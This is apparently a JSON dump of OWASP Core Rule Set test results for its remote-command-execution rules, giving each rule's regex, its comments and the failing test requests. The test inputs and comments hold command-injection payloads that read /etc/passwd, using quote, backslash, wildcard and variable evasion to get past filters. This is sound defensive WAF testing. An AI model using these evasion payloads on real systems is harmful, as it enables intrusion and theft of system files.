          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 153,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 153,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=if+%2Fi+exist+StorageServer.port+echo+yay",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932180",
    "test_id" : 2,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932180.yaml",
    "description" : "Test file upload with multipart/form-data and filename config.yml",
    "cause" : "failed expect_id check: 932180 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 2,
      "desc" : "Test file upload with multipart/form-data and filename config.yml",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "Proxy-Connection" : "keep-alive",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "multipart/form-data; boundary=----WebKitFormBoundaryABCDEFGIJKLMNOPQ"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "------WebKitFormBoundaryABCDEFGIJKLMNOPQ\nContent-Disposition: form-data; name=\"config\"; filename=\"config.yml\"\nContent-Type: text/yaml\n\n... Some content ...\n------WebKitFormBoundaryABCDEFGIJKLMNOPQ\nContent-Disposition: form-data; name=\"image\"; filename=\"test.png\"\nContent-Type: image/png\n\nBINARYDATA\n------WebKitFormBoundaryABCDEFGIJKLMNOPQ--\n"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932180 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932180,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ Restricted File Upload ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Detects attempts to upload a file with a forbidden filename."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Many application contain Unrestricted File Upload vulnerabilities."
        }, {
          "type" : "Comment",
          "text" : " https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " These might be abused to upload configuration files or other files"
        }, {
          "type" : "Comment",
          "text" : " that affect the behavior of the web server, possibly causing remote"
        }, {
          "type" : "Comment",
          "text" : " code execution."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The inverted chained rule enforces a word boundary for some entries that are prone to"
        }, {
          "type" : "Comment",
          "text" : " being detected as false positives. This can't be enforced for all entries since some are intentionally meant to match permutations."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "FILES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "X-Filename"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "X_Filename"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : "X-File-Name"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "pm_from_file",
        "value" : "restricted-upload.data"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932180
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Restricted File Upload Attempt"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "932190",
    "test_id" : 5,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932190.yaml",
    "description" : "Handle single quote evasion mixed with wild card evasion",
    "cause" : "failed expect_id check: 932190 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920170 - GET or HEAD Request with Body Content", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 5,
      "desc" : "Handle single quote evasion mixed with wild card evasion",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "Proxy-Connection" : "keep-alive",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get",
          "version" : "HTTP/1.1",
          "data" : "{\"foo\" : \";+cat+/e't'*/pa'?s'wd\"}"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932190 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932190,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ Bypass Rule 930120 (wildcard) ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " When Paranoia Level is set to 1 and 2, a Remote Command Execution"
        }, {
          "type" : "Comment",
          "text" : " could be exploited bypassing rule 930120 (OS File Access Attempt)"
        }, {
          "type" : "Comment",
          "text" : " by using wildcard characters."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " In some other cases, it could be bypassed even if the Paranoia Level is set to 3."
        }, {
          "type" : "Comment",
          "text" : " Please, keep in mind that this rule could lead to many false positives."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The following two blog posts explain the evasions this rule is designed to detect:"
        }, {
          "type" : "Comment",
          "text" : " - https://medium.com/secjuice/waf-evasion-techniques-718026d693d8"
        }, {
          "type" : "Comment",
          "text" : " - https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "/(?:[?*]+[a-z/]+|[a-z/]+[?*]+)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932190
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "normalizePath"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Wildcard bypass technique attempt"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-unix"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/3"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl3=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932190",
    "test_id" : 6,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932190.yaml",
    "description" : "Handle backslash evasion mixed with wild card evasion",
    "cause" : "failed expect_id check: 932190 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920170 - GET or HEAD Request with Body Content", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 6,
      "desc" : "Handle backslash evasion mixed with wild card evasion",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "Proxy-Connection" : "keep-alive",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get",
          "version" : "HTTP/1.1",
          "data" : "{\"foo\" : \";+cat+/e\\\\t\\\\*/pa\\\\?s\\\\wd\"}"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932190 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932190,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ Bypass Rule 930120 (wildcard) ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " When Paranoia Level is set to 1 and 2, a Remote Command Execution"
        }, {
          "type" : "Comment",
          "text" : " could be exploited bypassing rule 930120 (OS File Access Attempt)"
        }, {
          "type" : "Comment",
          "text" : " by using wildcard characters."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " In some other cases, it could be bypassed even if the Paranoia Level is set to 3."
        }, {
          "type" : "Comment",
          "text" : " Please, keep in mind that this rule could lead to many false positives."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The following two blog posts explain the evasions this rule is designed to detect:"
        }, {
          "type" : "Comment",
          "text" : " - https://medium.com/secjuice/waf-evasion-techniques-718026d693d8"
        }, {
          "type" : "Comment",
          "text" : " - https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "/(?:[?*]+[a-z/]+|[a-z/]+[?*]+)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932190
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "normalizePath"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Wildcard bypass technique attempt"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-unix"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/3"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl3=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932200",
    "test_id" : 13,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932200.yaml",
    "description" : "Test correct logging",
    "cause" : "nothing checked for test 13",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=932235 - Remote Command Execution: Unix Command Injection (command without evasion)", "phase=2 rule_id=932200 - RCE Bypass Technique", "phase=2 rule_id=932236 - Remote Command Execution: Unix Command Injection (command without evasion)", "phase=2 rule_id=932190 - Remote Command Execution: Wildcard bypass technique attempt", "phase=2 rule_id=942440 - SQL Comment Sequence Detected", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 13,
      "desc" : "Test correct logging",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?host=www.google.com;/bin/ca?+/et*/passwd",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "match_regex" : "found within ARGS:host:"
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932200,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ Rule 932200 ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Block RCE Bypass using different techniques:"
        }, {
          "type" : "Comment",
          "text" : " - uninitialized variables (https://www.secjuice.com/web-application-firewall-waf-evasion/)"
        }, {
          "type" : "Comment",
          "text" : " - string concatenations (https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)"
        }, {
          "type" : "Comment",
          "text" : " - globbing patterns (https://medium.com/secjuice/waf-evasion-techniques-718026d693d8)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : " - foo;cat$u+/etc$u/passwd"
        }, {
          "type" : "Comment",
          "text" : " - bar;cd+/etc;/bin$u/ca*+passwd"
        }, {
          "type" : "Comment",
          "text" : " - foo;ca\\t+/et\\c/pa\\s\\swd"
        }, {
          "type" : "Comment",
          "text" : " - foo;c'at'+/etc/pa's'swd"
        }, {
          "type" : "Comment",
          "text" : " - foo;c$@at+/et$@c/pas$@swd"
        }, {
          "type" : "Comment",
          "text" : " - foo;c$!at+/et$!c/pas$!swd"
        }, {
          "type" : "Comment",
          "text" : " - foo;c$*at+/et$*c/pas$*swd"
        }, {
          "type" : "Comment",
          "text" : " - foo;c$?at+/et$?c/pas$?swd"
        }, {
          "type" : "Comment",
          "text" : " - foo;c$-at+/et$-c/pas$-swd"
        }, {
          "type" : "Comment",
          "text" : " - foo;c$_at+/et$_c/pas$_swd"
        }, {
          "type" : "Comment",
          "text" : " - foo;c$$at+/et$$c/pas$$swd"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regex notes: https://regex101.com/r/V6wrCO/1"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The two chain rules looking for `/` and `\\s` prevent FPs for strings such as"
        }, {
          "type" : "Comment",
          "text" : " - pa$word"
        }, {
          "type" : "Comment",
          "text" : " - Price: $24.99"
        }, {
          "type" : "Comment",
          "text" : " - rando$mstr.in/g."
        }, {
          "type" : "Comment",
          "text" : " The regular expression does not include this requirement, but we're looking for a unix command"
        }, {
          "type" : "Comment",
          "text" : " separated by space, followed by an absolute path, e.g., `cat /etc/passwd`."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932200.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932200"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "['\\*\\?\\x5c`][^\\n/]+/|/[^/]+?['\\*\\?\\x5c`]|\\$[!#\\$\\(\\*\\-0-9\\?-\\[_a-\\{]"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
